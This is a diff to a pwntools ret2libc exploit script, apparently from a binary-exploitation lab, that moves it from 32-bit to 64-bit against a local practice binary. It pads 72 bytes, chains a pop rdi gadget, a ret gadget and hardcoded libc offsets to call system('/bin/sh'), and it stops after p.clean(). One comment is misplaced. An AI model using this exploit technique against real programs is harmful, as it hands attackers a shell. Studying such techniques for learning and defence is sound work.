@@ -1,21 +1,20 @@
-# 32-bit
+# 64-bit
 from pwn import *
 
-elf = context.binary = ELF('./bin/gcc_unguarded')
-p = process()
+p = process('./bin/gcc_unguarded')
 
-libc = elf.libc                        # Simply grab the libc it's running with
-libc.address = 0xf7da4000              # Set base address
+libc_base = 0x7ffff7dce000             # Set base address
 
-system = libc.sym['system']            # Grab location of system
-binsh = next(libc.search(b'/bin/sh'))  # grab string location
+system = libc_base + 0x4c490            # Grab location of system
+binsh = libc_base + 0x196031
 
-POP_RDI = 0x40115e
+POP_RDI = 0x40113a
 
 payload = b'A' * 72         # The padding
 payload += p64(POP_RDI)   # pop rdi; ret
-payload += p64(system)      # Location of system
-payload += p64(binsh)
+payload += p64(binsh)      # Location of system
+payload += p64(0x401016)
+payload += p64(system)
 payload += p64(0x0)
 
 p.clean()
